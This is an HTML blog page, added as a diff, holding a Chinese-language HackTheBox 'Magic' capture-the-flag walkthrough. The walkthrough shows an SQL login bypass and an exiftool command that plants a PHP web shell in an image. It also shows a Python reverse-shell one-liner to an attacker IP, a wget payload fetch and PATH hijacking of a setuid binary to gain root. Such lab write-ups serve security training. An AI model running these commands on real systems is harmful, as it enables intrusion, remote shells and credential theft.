@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>HackTheBox-Magic-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HackTheBox-Magic-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 22, 2020&nbsp;&nbsp;11:37:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/HackTheBox/">HackTheBox</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1431001467&auto=1&height=66"></iframe>
+
+<h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1580.png" alt="图片"></p>
+<p>靶机名：<code>Magic</code><br>OS：Linux<br>难度：中等<br>靶机IP：<code>10.10.10.185</code></p>
+<h2 id="运用到的知识"><a href="#运用到的知识" class="headerlink" title="运用到的知识"></a>运用到的知识</h2><p><code>SQL</code>万能密码原理<br><code>mysqldump</code>备份数据库<br><code>sysinfo</code>利用<code>lshw</code>提权</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先拿到靶机<code>IP</code>先对他进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 10.10.10.185 -T4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1581.png" alt="图片"></p>
+<p>发现了靶机开放了<code>22</code>（ssh）、<code>80</code>（http）服务，其他的端口被过滤了，我们先从web服务开始下手吧：（发现是一个图片托管站点）</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1582.png" alt="图片"></p>
+<p>打开后发现了一个登陆点：<a target="_blank" rel="noopener" href="http://10.10.10.185/login.php">http://10.10.10.185/login.php</a></p>
+<p>常规弱口令尝试了一遍失败了：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1583.png" alt="图片"></p>
+<h2 id="万能密码登陆后台GetSHELL"><a href="#万能密码登陆后台GetSHELL" class="headerlink" title="万能密码登陆后台GetSHELL"></a>万能密码登陆后台GetSHELL</h2><p>后来发现这是PHP的站，随后一个万能密码就登陆进去了：(<code>#</code>在<code>SQL</code>中代表<code>注释</code>，也就是说我们只需要输入正确的账号<code>#</code>，就能成功登陆)</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1584.png" alt="图片"></p>
+<p>登陆成功后来到了一个上传点：<a target="_blank" rel="noopener" href="http://10.10.10.185/upload.php">http://10.10.10.185/upload.php</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1585.png" alt="图片"></p>
+<p>之后我制作了一个图片马：（得安装一下<code>exiftool</code>这个工具）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#写入一句话到 saul.jpg</span><br><span class="line">exiftool -Comment=&#x27;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27; saul.jpg</span><br><span class="line"></span><br><span class="line">#复制一个saul.php.jpg文件</span><br><span class="line">cp saul.jpg saul.php.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1586.png" alt="图片"></p>
+<p>然后上传 <code>saul.php.jpg</code> 图片马成功<code>GetSHELL</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1587.png" alt="图片"></p>
+<p>随后利用<code>python</code>反弹<code>shell</code>到<code>nc</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.12&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1588.png" alt="图片"></p>
+<p>之后先得到一个 <code>bash</code> 外壳，不然 <code>sh</code> 外壳很难受：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1589.png" alt="图片"></p>
+<p>随后切换到网站根目录发现了一个配置文件里面有账号和密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private static $dbName = &#x27;Magic&#x27; ;</span><br><span class="line">private static $dbHost = &#x27;localhost&#x27; ;</span><br><span class="line">private static $dbUsername = &#x27;theseus&#x27;;</span><br><span class="line">private static $dbUserPassword = &#x27;iamkingtheseus&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1590.png" alt="图片"></p>
+<p>然而我查看 <code>passwd</code> 文件发现也有这个账号：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1591.png" alt="图片"></p>
+<p>猜测有可能会撞库，<code>ssh</code> 的账号有可能和配置文件的账号密码是一样的，我们先 <code>su</code> 切换一下用户：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1592.png" alt="图片"></p>
+<p>发现提示：<code>su: must be run from a terminal</code></p>
+<p>之后Google了一下发现有类似情况：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292">su: must be run from a terminal</a></p>
+<p>发现可以用这个绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/asdf.py</span><br><span class="line">$ python3 /tmp/asdf.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1593.png" alt="图片"></p>
+<p>虽然是绕过了，但是还是登陆失败！</p>
+<h2 id="备份数据库发现密码"><a href="#备份数据库发现密码" class="headerlink" title="备份数据库发现密码"></a>备份数据库发现密码</h2><p>之后用 <code>mysqldump</code> 备份了一下数据库发现了一些信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -utheseus -piamkingtheseus Magic</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1594.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic</span><br><span class="line">mysqldump -utheseus -piamkingtheseus Magic</span><br><span class="line">mysqldump: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: Magic</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version       5.7.29-0ubuntu0.18.04.1</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;</span><br><span class="line">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */;</span><br><span class="line">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#x27;NO_AUTO_VALUE_ON_ZERO&#x27; */;</span><br><span class="line">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table `login`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `login`;</span><br><span class="line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span><br><span class="line">/*!40101 SET character_set_client = utf8 */;</span><br><span class="line">CREATE TABLE `login` (</span><br><span class="line">  `id` int(6) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(50) NOT NULL,</span><br><span class="line">  `password` varchar(100) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `username` (`username`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;</span><br><span class="line">/*!40101 SET character_set_client = @saved_cs_client */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table `login`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES `login` WRITE;</span><br><span class="line">/*!40000 ALTER TABLE `login` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `login` VALUES (1,&#x27;admin&#x27;,&#x27;Th3s3usW4sK1ng&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `login` ENABLE KEYS */;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br><span class="line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2020-04-21 19:34:38</span><br><span class="line">www-data@ubuntu:/var/www/Magic$ </span><br></pre></td></tr></table></figure>
+
+<p>我们得到了一个敏感的插入字段的SQL语句从而又得到了一个账号密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `login` VALUES (1,&#x27;admin&#x27;,&#x27;Th3s3usW4sK1ng&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>su</code> 切换到 <code>theseus</code> 用户使用刚刚得到的密码登陆成功：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1595.png" alt="图片"></p>
+<p>之后在用户<code>home</code>目录下拿到 <code>user.txt</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1596.png" alt="图片"></p>
+<h2 id="sysinfo权限提升root"><a href="#sysinfo权限提升root" class="headerlink" title="sysinfo权限提升root"></a>sysinfo权限提升root</h2><p>这个时候就先想办法登陆到它的<code>ssh</code>，我先是在本地kali生成了一个<code>ssh公钥</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1597.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DpODZcrjmZeJaBpvd1Jb2a+liQdQfoSA/ld4BeEZtoVeFbCm8Uhq1SgVV9q9Mjqp0EKvxmDlZzyYkT+cc9c7ffI2aqUuZlg+B1KZ5tWfdP6NN6EGaDE5aFoKWRlvIaHFTftcnTRvuh3hF9CAX2f5GtLdQ5EAB+LyYbi+EaYKNzkk8/Dp7XVQXk+hm5vRkATNN0cxaZjbv6/L6CTyI4ZPcqio+X2mMz9G4j7e7vdpik10TDIWebLAir/9rkJtkCkMawIOddug8ajHbcvFhokXCuYTcWXHKkuvo0zRiAhyoeMK9f8Hb5DfMZhrNPm0xHaK5bkMOmUlUOtLV8w7k2aCkZ+Cm+uLdVeh409GrlddNPsyD3Qi9gGbPbd+SlOlvvBqEcnQXQdWXHmd6KLbs4syiemiLbxRDizEVKL6hF7AumCpl84/6MUAfbmKZc6COrC4qynyS6xTuU1OS5UsS3dTna8v6o8bcrbIDL0GZIYfhbcomyKHvzkSDiihxGdSYU0= root@kali</span><br></pre></td></tr></table></figure>
+
+<p>之后再靶机上<code>echo</code> 这个 <code>id_rsa.pub</code>一个公钥命名为<code>authorized_keys</code>（这个文件用于连接SSH）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9DpODZcrjmZeJaBpvd1Jb2a+liQdQfoSA/ld4BeEZtoVeFbCm8Uhq1SgVV9q9Mjqp0EKvxmDlZzyYkT+cc9c7ffI2aqUuZlg+B1KZ5tWfdP6NN6EGaDE5aFoKWRlvIaHFTftcnTRvuh3hF9CAX2f5GtLdQ5EAB+LyYbi+EaYKNzkk8/Dp7XVQXk+hm5vRkATNN0cxaZjbv6/L6CTyI4ZPcqio+X2mMz9G4j7e7vdpik10TDIWebLAir/9rkJtkCkMawIOddug8ajHbcvFhokXCuYTcWXHKkuvo0zRiAhyoeMK9f8Hb5DfMZhrNPm0xHaK5bkMOmUlUOtLV8w7k2aCkZ+Cm+uLdVeh409GrlddNPsyD3Qi9gGbPbd+SlOlvvBqEcnQXQdWXHmd6KLbs4syiemiLbxRDizEVKL6hF7AumCpl84/6MUAfbmKZc6COrC4qynyS6xTuU1OS5UsS3dTna8v6o8bcrbIDL0GZIYfhbcomyKHvzkSDiihxGdSYU0= root@kali&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1598.png" alt="图片"></p>
+<p>紧接着在KALI连接SSH公钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /root/.ssh/id_rsa theseus@10.10.10.185</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1599.png" alt="图片"></p>
+<p>登陆成功后我在 <code>/bin</code> 目录下发现了一个 <code>sysinfo</code> 引起了我的注意（有<code>root</code>权限）:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1600.png" alt="图片"></p>
+<p>之后我在本机KALI开启一个web服务用于上传文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">9000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1601.png" alt="图片"></p>
+<p>我们的 <code>lshw</code> 文件 是 <code>Linux</code> 下一个可以<code>查看硬件信息</code>的文件，然后我建立的 <code>lshw</code> 文件是一个<code>python的反向连接nc</code>的payload：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1602.png" alt="图片"></p>
+<blockquote>
+<p>这样目标在运行了这个文件那么我们就会反弹shell到nc从而进行权限提升！</p>
+</blockquote>
+<p>随后在目标靶机上下载<code>lshw</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.14.12:9000/lshw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1603.png" alt="图片"></p>
+<p>最后设置环境变量为<code>lshw</code>所在的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/saul:$PATH</span><br></pre></td></tr></table></figure>
+
+<p><code>nc</code> 监听端口 <code>4444</code>，然后运行 <code>sysinfo</code> 成功反弹<code>root权限的shell</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1604.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1605.png" alt="图片"></p>
+<p>之后让它得到一个<code>bash</code>外壳：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1606.png" alt="图片"></p>
+<p>最后也是在 <code>/root</code> 目录拿到 <code>root.txt</code> 完成这次靶机演练！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/04/22/HackTheBox-Magic/">http://example.com/2020/04/22/HackTheBox-Magic/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/HackTheBox/"># HackTheBox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/27/PHP-OOP/">PHP面向对象OOP学习笔记</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/18/MySQL-4/">MySQL手注之延时盲注(基于时间的盲注)</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
